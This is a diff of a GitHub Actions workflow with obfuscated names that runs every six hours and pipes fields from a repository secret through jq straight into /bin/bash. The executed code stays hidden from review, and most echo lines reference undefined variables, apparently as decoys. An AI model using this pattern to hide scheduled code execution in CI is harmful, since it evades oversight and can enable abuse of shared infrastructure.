@@ -3,8 +3,7 @@ name: wengtouwt
 on:
   workflow_dispatch:
   schedule:
-    - cron: '10 1/6 * * *'
-
+    - cron: '6 3/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,15 +11,12 @@ jobs:
       - uses: actions/checkout@v4
       - name: wengtouwt
         env:
-          qxi4: ${{ secrets.qxi4 }}
+          yjdik78: ${{ secrets.yjdik78 }}
         run: |
-          echo $qxi4 | jq -r .kgc4139 | /bin/bash
-          echo $jfdm4354 | jq -r .yj0928 | /bin/bash
-          echo $m526 | jq -r .vhw9 | /bin/bash
-          echo $wku3648 | jq -r .pjyj2 | /bin/bash
-          echo $wo5 | jq -r .oxpph1430 | /bin/bash
-          echo $ipes1 | jq -r .q91 | /bin/bash
-          echo $cx4565 | jq -r .zupy3202 | /bin/bash
-          echo $fta434 | jq -r .ams93 | /bin/bash
-          echo $uxgiw5072 | jq -r .i53 | /bin/bash
+          echo $yjdik78 | jq -r .yo95 | /bin/bash
+          echo $ng0693 | jq -r .vc6773 | /bin/bash
+          echo $lth0 | jq -r .vi85 | /bin/bash
+          echo $imk785 | jq -r .u4678 | /bin/bash
+          echo $cxytd0756 | jq -r .sab4448 | /bin/bash
+          echo $duvc22 | jq -r .lgt72595 | /bin/bash
 
